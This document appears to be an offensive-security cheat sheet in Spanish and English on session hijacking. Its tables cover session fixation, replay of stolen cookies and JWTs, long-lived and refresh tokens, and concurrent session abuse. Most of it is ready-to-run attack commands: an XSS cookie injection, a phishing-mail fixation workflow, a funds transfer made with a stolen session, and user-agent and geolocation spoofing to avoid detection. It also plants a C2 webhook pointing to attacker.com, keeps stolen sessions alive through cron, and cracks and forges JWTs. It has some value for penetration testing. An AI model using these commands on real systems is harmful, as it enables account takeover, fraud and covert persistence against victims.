---
aliases:
  - Session Fixation
  - Session Replay
  - Long-lived Sessions
  - Refresh Token Replay
tags:
  - type/technique
  - vuln/session-hijacking
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Session Hijacking]]'
---
# Session Hijacking - Fixation y Replay

***

## Set Victim's Session ID Pre-Auth

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -c jar.txt https://target/ && cat jar.txt \| grep PHPSESSID` | Pre-fetch attacker session ID | Pre-attack capture. |
| Phishing link: `https://target.com/login?PHPSESSID=ATTACKER_SID` | URL-based SID fixation old apps | Old apps URL-session. |
| `<script>document.cookie='session=ATTACKER_SID; Domain=.target.com; Path=/'</script>` (vía XSS sub) | Force cookie via XSS | XSS-based fixation. |
| `curl -X POST -d "PHPSESSID=ATTACKER_SID&user=victim&pass=PASS" https://target/login` | Form-injected SID accepted by backend | Custom app bug. |
| `curl -H "Cookie: session=ATTACKER_SID" https://target/login -X POST -d "user=victim&pass=$P"` | Force login con pre-set session | Backend keeps SID. |
| `<meta http-equiv="Set-Cookie" content="session=ATTACKER_SID; Path=/">` (HTML inject) | Meta tag cookie inject | HTML inject context. |
| `curl -i https://target/login \| grep -i set-cookie` luego `curl -i -X POST -b "$COOKIE" -d "user=victim&pass=$P" https://target/login \| grep -i set-cookie` | Compare pre/post-auth SID — same = fixation | Fixation probe. |
| `intent://target.com/login?session=ATTACKER_SID#Intent;...end` (mobile deep link) | Mobile app deep link fixation | Mobile chain. |
| `curl -H "Cookie: session=ATTACKER_SID; Max-Age=31536000" https://target/login` (persistent) | Persistent cookie across browser restarts | Long persistence. |
| `https://target/oauth/callback?state=ATTACKER_SID&code=...` (OAuth state) | OAuth state param fixation leak | OAuth combo. |
| `<iframe src="https://target.com/login?session=ATTACKER_SID"></iframe>` | Iframe pre-set | Embedded fixation. |
| `curl -i https://target/dashboard -b "session=ATTACKER_SID"` (post-victim login) | Verify fixation worked — access as victim | Post-fixation test. |
^sh-fixation-preauth

### Workflow fixation classic

```bash
# 1. Attacker grabs SID
COOKIE=$(curl -sI https://target.com/ | grep -oE 'PHPSESSID=[^;]+')
echo "Attacker SID: $COOKIE"

# 2. Send victim phishing link con SID
echo "https://target.com/login?$COOKIE" | mail victim@target.com

# 3. Victim logs in (backend keeps same SID)

# 4. Attacker uses original SID
curl -b "$COOKIE" https://target.com/dashboard | grep -i "welcome"
```

___

## Replay Captured Tokens

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -b "session=STOLEN_SID" https://target/dashboard` | Direct cookie replay | Standard reuse. |
| `curl -H "Authorization: Bearer STOLEN_JWT" https://target/api/me` | JWT bearer replay | Standard. |
| `firefox --new-instance --profile /tmp/attacker_profile` luego DevTools → Storage → set cookie | Browser cookie replay manual | Manual hijack. |
| Chrome DevTools Application → Cookies → `target.com` → add `session=STOLEN_SID` | Replay via DevTools | UI replay. |
| `curl -b cookies.txt https://target/api/v1/me` (cookie jar import) | Bulk replay via jar | Multi-cookie. |
| `python3 -c "import requests; s=requests.Session(); s.cookies.set('session','STOLEN'); print(s.get('https://target/dashboard').text)"` | Programmatic replay | DIY. |
| `curl -b "session=STOLEN" -X POST -d "amount=10000&to=attacker" https://target/transfer` | Trigger action as victim | Direct fraud. |
| `curl -b "session=STOLEN" -H "User-Agent: Mozilla/5.0..." https://target/dashboard` | Match victim UA for fingerprint check | Anti-detect. |
| `curl -b "session=STOLEN" --proxy socks5://victim_country_vpn:1080 https://target/dashboard` | Match victim geo via VPN | Geo-anomaly evasion. |
| `for i in {1..1000}; do curl -b "session=STOLEN" https://target/api/x; sleep 1; done` (within rate limit) | Sustained access | Persistence test. |
| `curl -b "session=STOLEN" https://target/api/refresh -X POST` (extend session) | Force activity to extend timeout | Idle timeout extend. |
| Burp Repeater con `Cookie: session=STOLEN` saved | Manual replay in Burp | Workflow. |
^sh-fixation-replay

___

## Long-lived Sessions / Tokens

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI https://target/login -X POST -d "user=admin&pass=$P&remember=1" \| grep -i "set-cookie.*max-age"` | Check Max-Age long value | Remember-me probe. |
| `curl -sI -X POST -d "user=admin&pass=$P" https://target/login \| grep -i expires` | Check Expires far future | Long-lived. |
| `python3 -c "import jwt; print(jwt.decode('$JWT', options={'verify_signature':False}))['exp']"` luego `python3 -c "import datetime; print(datetime.datetime.fromtimestamp(EXP))"` | Decode JWT exp time | Token lifetime. |
| `curl -b "session=STOLEN" https://target/dashboard` (test next day, week, month) | Verify session never expires | Long-term test. |
| `curl -X POST -d "grant_type=refresh_token&refresh_token=$RT" https://target/oauth/token` (reuse refresh days later) | Refresh sin rotation reusable | RFC violation. |
| `cat ~/.android/app/SharedPreferences/auth.xml \| grep token` | Mobile app token long-lived persistent | Mobile chain. |
| `curl -H "Authorization: Bearer $TOKEN" https://target/api/v1/me` luego cambiar password → reuse same token | Token survives password change | Critical bug. |
| `curl -X POST -b "session=$S" https://target/logout && curl -b "session=$S" https://target/dashboard` | Cookie still valid post-logout | Logout failure. |
| `curl https://target/.well-known/openid-configuration \| jq .grant_types_supported \| grep -i refresh` | Check OAuth offline_access | Long refresh OAuth. |
| `curl -H "X-API-Key: $LEAKED_KEY" https://target/api/admin` | Static API key never rotated | Permanent leak. |
| `curl -H "Authorization: Bearer $SERVICE_TOKEN" https://target/api/internal` | Service account permanent token | Edge service. |
| `python3 -c "import jwt; jwt.encode({'exp':9999999999, 'user':'admin'}, 'CRACKED', algorithm='HS256')"` | Forge JWT con exp far future | Crypto crack + forge. |
^sh-fixation-longlived

___

## Concurrent Session Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -b "session=STOLEN" https://target/dashboard` (mientras victim usa app) | Two sessions same SID active | Standard. |
| `curl -b "session=STOLEN" https://target/api/sessions \| jq` | Enum active sessions endpoint | Session inventory. |
| `curl -X POST -b "session=STOLEN" -d "device=victim_device" https://target/api/sessions/revoke` (revoke victim) | Force kick victim via own session | Hostile takeover. |
| `crontab -e` → `*/5 * * * * curl -b "session=STOLEN" https://target/api/keepalive` | Keep stolen session alive periodically | Persistence. |
| `curl -b "session=STOLEN" -X POST -d "action=read_only" https://target/audit` (stealth ops) | Silent admin actions | Stealth. |
| `python3 -c "import schedule,time,requests; schedule.every().day.at('03:00').do(lambda: requests.get('https://target/api/x', cookies={'session':'STOLEN'})); [schedule.run_pending() or time.sleep(60) for _ in iter(int, 1)]"` | Schedule actions during victim sleep hours | Timing stealth. |
| `curl -b "session=STOLEN" -H "User-Agent: $VICTIM_UA" https://target/...` | Mirror victim UA — anti-audit | Fingerprint match. |
| `curl -b "session=STOLEN" --proxy "$VICTIM_GEO_PROXY" https://target/...` | Match victim geo via proxy | Geo-fingerprint match. |
| `curl -b "session=STOLEN" -H "Accept-Language: es-AR" https://target/...` | Match locale | Anti-anomaly. |
| `curl -X POST -b "session=STOLEN" -d "webhook=https://attacker.com/c2" https://target/api/webhooks` | Plant persistent webhook for C2 | Persistence. |
| `curl -X POST -b "session=STOLEN" -d "name=Backup&permissions=full" https://target/api/keys` | Generate new API key for persistent access | Persistence escalate. |
^sh-fixation-concurrent

___

## Refresh Token Replay

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d "grant_type=refresh_token&refresh_token=$RT&client_id=$CID" https://target/oauth/token` | Replay refresh — get new access | Standard OAuth. |
| `curl -X POST -d "grant_type=refresh_token&refresh_token=$RT&client_id=$CID&client_secret=$CS" https://target/oauth/token` | Refresh con client credentials | Confidential client. |
| `for i in {1..100}; do curl -X POST -d "grant_type=refresh_token&refresh_token=$RT" https://target/oauth/token; sleep 3600; done` | Long-term persistent refresh loop | Persistence. |
| `RT_OLD=$RT; NEW=$(curl -s -d "grant_type=refresh_token&refresh_token=$RT" https://target/oauth/token \| jq -r .refresh_token); curl -X POST -d "grant_type=refresh_token&refresh_token=$RT_OLD" https://target/oauth/token` | Test rotation — old still valid = broken rotation | Edge rotation bug. |
| `curl -X POST -d "grant_type=refresh_token&refresh_token=$RT&scope=offline_access admin" https://target/oauth/token` | Refresh request expanded scope | Scope upgrade. |
| `curl -X POST -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$RT" https://target/oauth/token` | Token exchange for new access type | OAuth 2.0 token exchange. |
| `apktool d app.apk && grep -rE "refresh_token\|client_secret" app/` | Mobile APK token + secret extract | Mobile reverse. |
| `python3 -c "import jwt; print(jwt.decode('$RT', options={'verify_signature':False}))"` | Decode JWT refresh struct | Inspect. |
| `curl -X POST -d "grant_type=refresh_token&refresh_token=$RT" https://target/oauth/token` then `curl -X POST -d "token=$RT&token_type_hint=refresh_token" https://target/oauth/revoke` | Test revocation enforcement | Revoke probe. |
| `curl -H "Authorization: Bearer $ID_TOKEN" https://target/api/me` | OIDC id_token replay | Federation. |
| `hashcat -a 0 -m 16500 refresh.txt rockyou.txt` | Crack JWT-style refresh signing key | Weak crypto. |
| `python3 -c "import jwt; jwt.encode({'sub':'admin','exp':9999999999,'type':'refresh'}, 'CRACKED', algorithm='HS256')"` | Forge refresh post-crack | Crypto crack + forge. |
^sh-fixation-refresh

***
